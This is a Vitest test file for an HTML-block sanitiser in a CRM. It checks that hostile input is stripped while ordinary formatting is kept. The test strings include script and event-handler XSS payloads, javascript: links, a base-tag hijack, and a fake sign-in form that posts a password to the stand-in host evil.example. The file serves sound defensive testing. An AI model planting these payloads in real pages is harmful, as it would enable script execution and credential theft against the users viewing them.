import { describe, expect, it } from 'vitest'
import { sanitizeHtmlBlock } from './html-block'

// The table editor writes the HTML block; every staff member who opens a
// record sees it inside the signed-in CRM.
describe('sanitizeHtmlBlock', () => {
  it('strips script and event-handler XSS', () => {
    const out = sanitizeHtmlBlock('<p>Hi</p><script>alert(1)</script><img src=x onerror=alert(1)><svg><animate onbegin=alert(1)>')
    expect(out).toContain('<p>Hi</p>')
    expect(out).not.toMatch(/script|onerror|onbegin/i)
  })

  it('drops javascript: links', () => {
    const out = sanitizeHtmlBlock('<a href="javascript:alert(1)">x</a><a href=" JaVaScRiPt:alert(1)">y</a>')
    expect(out).not.toMatch(/javascript/i)
  })

  it('removes fake sign-in forms and page-wide style sheets', () => {
    const out = sanitizeHtmlBlock(
      '<form action="https://evil.example/steal"><input name="password" type="password"><button formaction="https://evil.example">Sign in</button></form>' +
        '<style>body{display:none}</style><base href="https://evil.example/">',
    )
    expect(out).not.toMatch(/<form|<input|<button|<style|<base|evil\.example/i)
  })

  it('never lets a link target another browsing context', () => {
    const out = sanitizeHtmlBlock('<a href="https://example.com" target="_blank">site</a>')
    expect(out).toBe('<a href="https://example.com">site</a>')
  })

  it('keeps ordinary formatting', () => {
    const out = sanitizeHtmlBlock('<p><b>Note</b> <em>please</em></p><ul><li>one</li></ul><a href="https://example.com">link</a>')
    expect(out).toBe('<p><b>Note</b> <em>please</em></p><ul><li>one</li></ul><a href="https://example.com">link</a>')
  })
})
